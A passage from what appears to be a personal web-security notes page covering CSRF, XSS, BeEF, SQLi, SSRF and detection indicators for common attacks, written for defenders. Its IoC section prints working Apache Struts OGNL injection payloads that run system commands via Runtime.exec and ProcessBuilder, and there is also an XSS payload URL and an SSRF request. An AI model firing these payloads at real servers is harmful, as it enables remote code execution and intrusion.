</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">responseData</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">responseData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span></span></code></pre></div><p>But that poses two problems:</p>
<ol>
<li>How does it &ldquo;guess&rdquo; the value of the token? The attacker can hope that there is some vulnerability in the token generation or validation.</li>
<li>Once the custom header is sent, the request ceases to be a simple one and preflight is sent first. And if there are no misconfigurations associated with the CORS policy, or no CORS policy is set up at all, the request will NOT be sent.</li>
</ol>
<blockquote>
<p>‚ùóÔ∏è Of course, there are other mechanisms that need to be leveraged to protect from CSRF, since CORS is not a CSRF mitigation!</p>
</blockquote>
<h3 id="samesite">SameSite</h3>
<p>Before this was invented, when the browser made cross-origin requests, the cookies for the website were sent over automatically. Although the attacking website initiating this cross-origin requrest could not READ the response (protected by SOP) or the cookies themselves, still it was possible to make some changes on the target website without user knowledge USING those cookies if a CSRF vulnerability was present there.</p>
<p>Google Chrome has changed its default behavior to treat cookies without a <code>SameSite</code> attribute as if they were set to <code>SameSite=Lax</code>. This means that if you want to allow cross-site cookie usage, you need to explicitly set <code>SameSite=None</code> and <code>Secure</code>.</p>
<h3 id="referer-based-validation">Referer-based validation</h3>
<h2 id="xss">XSS</h2>
<p>Userful reference for XSS payload construction: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>.</p>
<h3 id="reflected">Reflected</h3>
<h3 id="stored">Stored</h3>
<h3 id="dom">DOM</h3>
<p>That&rsquo;s the only type of XSS that <strong>doesn&rsquo;t require any interaction with the server</strong>, all the magic happens in the client-side code. But the root cause is still the same: no sanitisation of user input.</p>
<p>For example, if there is such code in the JS code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;searchResults&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;Search results for: &#39;</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
</span></span></code></pre></div><p>User input gets written to page displayed to the client (without any refreshing or sending requests to the server). If the user clicks a link like this <code>https://example.com/search?%3Cscript%3Ealert('XSS')%3C/script%3E</code>, the XSS will fire ‚òÑÔ∏è.</p>
<h3 id="-beef">üõ† BeEF</h3>
<p><strong>Prerequisites</strong>:</p>
<ol>
<li><strong>Vulnerable web page</strong>: There must be a vulnerable web page where you can inject the BeEF hook JavaScript payload. This could be a page with a Cross-site Scripting (XSS) vulnerability or any other way to execute JavaScript code in the context of the target&rsquo;s browser.</li>
<li><strong>BeEF server</strong>: A running BeEF server is required to serve the BeEF hook JavaScript payload and manage hooked browsers. The BeEF server listens for incoming connections from hooked browsers and provides the web-based interface for the attacker to control the hooked browsers and execute various modules.</li>
<li><strong>Hooked browser</strong>: The target user must visit the vulnerable web page containing the injected BeEF hook JavaScript payload using a web browser. Once the user&rsquo;s browser executes the payload, it will establish a connection with the BeEF server, enabling the attacker to perform various attacks using the BeEF framework.</li>
<li><strong>Network accessibility</strong>: The target&rsquo;s browser must be able to reach the BeEF server over the network. In some cases, this might require the BeEF server to have a public IP address or be accessible through a proxy or VPN. Network firewalls and filtering can also prevent the BeEF hook from functioning properly.</li>
<li><strong>JavaScript enabled</strong>: The target&rsquo;s browser must have JavaScript enabled, as the BeEF hook relies on JavaScript to establish a connection with the BeEF server and execute the attacker&rsquo;s commands.</li>
</ol>
<h2 id="sqli">SQLi</h2>
<p>Basically, the same root cause as with XSS - insufficient sanitisation of user input.</p>
<h2 id="directory-traversal">Directory Traversal</h2>
<h2 id="get-vs-post">GET vs POST</h2>
<p>GET parameters can be visible to the attacker even when TLS is in place in the following cases:</p>
<ol>
<li>Server Name Indication (SNI): SNI is an extension of the TLS protocol that allows clients to specify the domain name they want to connect to. While the GET parameters themselves are not exposed, the domain name and path in the URL may be visible to anyone monitoring the connection, potentially revealing sensitive information.</li>
<li>Browser History and Cache: Although encrypted during transmission, the full URL, including GET parameters, is stored in the browser&rsquo;s history and cache. If an attacker gains access to the user&rsquo;s computer or browser data, they could potentially view the GET parameters.</li>
<li>HTTP Referer Header: The HTTP referer header is sent by browsers when navigating from one page to another, indicating the URL of the referring page. If the referring page&rsquo;s URL contains GET parameters, they may be exposed to third-party websites when following a link or submitting a form.</li>
<li>Web Server Logs: Web servers typically log the full URL of each request, including GET parameters. If an attacker gains access to the web server logs, they could potentially view sensitive information contained in GET parameters.</li>
<li>Network Monitoring and Logging Tools: In corporate or public networks, monitoring tools may be in place to log network traffic, including URLs. While the content of the communication is encrypted, the URL, including GET parameters, might be logged and visible to network administrators or anyone with access to the logs.</li>
</ol>
<h2 id="ioc--investigation-tips">IoC &amp; Investigation Tips</h2>
<h3 id="sqli-1">SQLi</h3>
<h4 id="-detections">üö® Detections</h4>
<ul>
<li><input disabled="" type="checkbox"> If the majority of SQL requests are <code>SELECT</code> and you see <code>DROP TABLE</code>.</li>
<li><input disabled="" type="checkbox"> Many 500 status codes could indicate</li>
</ul>
<h4 id="-payloads-iocs">‚öôÔ∏è Payloads IoCs</h4>
<p><a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a>
<a href="https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt">https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt</a>
<a href="https://github.com/omurugur/SQL_Injection_Payload">https://github.com/omurugur/SQL_Injection_Payload</a></p>
<h4 id="-tools-iocs">üõ† Tools IoCs</h4>
<h5 id="sqlmap"><code>sqlmap</code></h5>
<p>It can be run as a standalone CLI tool or as a part of Burp.</p>
<ul>
<li><input disabled="" type="checkbox"> <code>User-Agent</code> HTTP header contains sqlmap and its version by default.</li>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="xxs">XXS</h3>
<p>There are three types of XSS: DOM, Stored and reflected.</p>
<h4 id="-payloads-iocs-1">‚öôÔ∏è Payloads IoCs</h4>
<p><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></p>
<h4 id="-tools-iocs-1">üõ† Tools IoCs</h4>
<h3 id="xxe">XXE</h3>
<h3 id="-payloads-iocs-2">‚öôÔ∏è Payloads IoCs</h3>
<p><a href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></p>
<h4 id="-tools-iocs-2">üõ† Tools IoCs</h4>
<h3 id="cmdi">CMDi</h3>
<h4 id="-payloads-iocs-3">‚öôÔ∏è Payloads IoCs</h4>
<p><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p>
<ul>
<li><input disabled="" type="checkbox"> <code>ping</code> and <code>nslookup</code> keywords where these are not expected</li>
</ul>
<h4 id="-tools-iocs-3">üõ† Tools IoCs</h4>
<h3 id="idor">IDOR</h3>
<h4 id="-payloads-iocs-4">‚öôÔ∏è Payloads IoCs</h4>
<p>It&rsquo;s a very special vulnerability, and it&rsquo;s hard to define a pattern. If you log IP addresses and user IDs (id, username, email or any other identification) - look for the requests with the same IP and different ID.</p>
<p>Multiple <code>404</code> HTTP status code would be probably seen in this case if the attacker, who has found this issue, tried to enumerate IDs. Of course, to completely prevent IDOR one needs to implement proper authorisation process, however, it&rsquo;s also clear from this vulnerability why having short and predictable IDs is not good. But even if the IDs are randomly generated GUIDs, still this won&rsquo;t protect from IDOR, just make the attacker&rsquo;s life a little harder.</p>
<h4 id="-tools-iocs-4">üõ† Tools IoCs</h4>
<ul>
<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
</ul>
<h3 id="html-injection">HTML Injection</h3>
<p>About this vulnerability read <a href="https://www.invicti.com/learn/html-injection/">here</a>.</p>
<h3 id="ognl">OGNL</h3>
<p>About OGNL, read <a href="https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts">here</a>.</p>
<h4 id="-payloads-iocs-5">‚öôÔ∏è Payloads IoCs</h4>
<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb</a></p>
<ul>
<li><input disabled="" type="checkbox"> <code>gk6q${‚Äúzkz‚Äù.toString().replace(‚Äúk‚Äù, ‚Äúx‚Äù)}doap2</code></li>
<li><input disabled="" type="checkbox"> <code>https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&amp;INJPARAM=HOOK_VAL</code></li>
<li><input disabled="" type="checkbox"> <code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Qualys-Response&quot;,#a))}</code></li>
<li><input disabled="" type="checkbox"> <code>(#_='multipart/form-data')</code></li>
<li><input disabled="" type="checkbox"> <code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code></li>
<li><input disabled="" type="checkbox"> <code>(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])</code></li>
<li><input disabled="" type="checkbox"> <code>(#context['xwork.MethodAccessor.denyMethodExecution']=false)</code></li>
<li><input disabled="" type="checkbox"> <code>(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&gt;</code></li>
<li><input disabled="" type="checkbox"> <code>(#ognlUtil.getExcludedPackageNames().clear())</code></li>
<li><input disabled="" type="checkbox"> <code>(#ognlUtil.getExcludedClasses().clear())</code></li>
<li><input disabled="" type="checkbox"> <code>(#context.setMemberAccess(#dm))))</code></li>
<li><input disabled="" type="checkbox"> <code>(#cmd='/usr/bin/touch /tmp/pwned').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))</code></li>
<li><input disabled="" type="checkbox"> <code>(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))</code></li>
<li><input disabled="" type="checkbox"> <code>(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</code></li>
<li><input disabled="" type="checkbox"> <code>(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))</code></li>
<li><input disabled="" type="checkbox"> <code>(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</code></li>
</ul>
<h4 id="-tools-iocs-5">üõ† Tools IoCs</h4>
<ul>
<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
</ul>
<h3 id="botnets">Botnets</h3>
<p>Below are some things to use when trying to spot a botnet operating.</p>
<ol>
<li>Outdates or unusual User Agents.</li>
<li>A lot of requests coming from one IP or a small range of IP addresses.</li>
<li>Patterns indicative of automated activity.</li>
<li>Frequent requests, more frequent than with a legit user.</li>
</ol>
<p>Check the IP addresses associated with the user agent strings. If a large number of requests with the same user agent are coming from the same IP address or a small range of IP addresses, it could be an indication of a botnet.</p>
<h3 id="dirbusting">Dirbusting</h3>
<h4 id="-payloads-iocs-6">‚öôÔ∏è Payloads IoCs</h4>
<h4 id="-tools-iocs-6">üõ† Tools IoCs</h4>
<ul>
<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
<li><input disabled="" type="checkbox"> <code>dirb</code>
<ul>
<li><input disabled="" type="checkbox"> Linux</li>
<li><input disabled="" type="checkbox"> macOS</li>
</ul>
</li>
</ul>
<h3 id="fuzzing">Fuzzing</h3>
<h4 id="-payloads-iocs-7">‚öôÔ∏è Payloads IoCs</h4>
<ul>
<li><input disabled="" type="checkbox"> <a href="https://github.com/Bo0oM/fuzz.txt">fuzz.txt</a></li>
</ul>
<h4 id="-tools-iocs-7">üõ† Tools IoCs</h4>
<h3 id="swiss-knives-frameworks-and-other-tools-ioc">Swiss Knives, Frameworks and Other Tools&rsquo; IoC</h3>
<h4 id="burp">Burp</h4>
<ul>
<li><input disabled="" type="checkbox"> <code>*.oastify.com</code> domain</li>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h4 id="metasploit">Metasploit</h4>
<h4 id="postman">Postman</h4>
<ul>
<li><input disabled="" type="checkbox"> The <code>User-Agent</code> HTTP header contains <code>Postman</code> keyword and its version.</li>
</ul>
<h3 id="ssrf">SSRF</h3>
<p><strong>S</strong>erver-<strong>s</strong>ide <strong>r</strong>equest <strong>f</strong>orgery. What&rsquo;s the easiest way to detect that the vulnerability is present? It requires a URL-like parameter to be present (see example below). In case there is some fiiltering by IP in place, this vulnerability can be used to get this restricted information via this vulnerable server.</p>
<p><strong>Example</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">POST /product/stock HTTP/1.0
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">118</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">stockApi</span><span class="o">=</span>http://192.168.0.68/admin
</span></span></code></pre></div><p>More info <a href="https://portswigger.net/web-security/ssrf">here</a>.</p>
<h2 id="references">References</h2>
<details>
    <summary>Expand&hellip;</summary>
    <h3 id="portswigger-sop-article">Portswigger SOP article</h3>
<p><a href="https://portswigger.net/web-security/cors/same-origin-policy">https://portswigger.net/web-security/cors/same-origin-policy</a></p>
<h3 id="portswigger-cors-article">Portswigger CORS article</h3>
<p><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>

</details>
  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
            </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
  

  
  
  
    
  


</body>

</html>
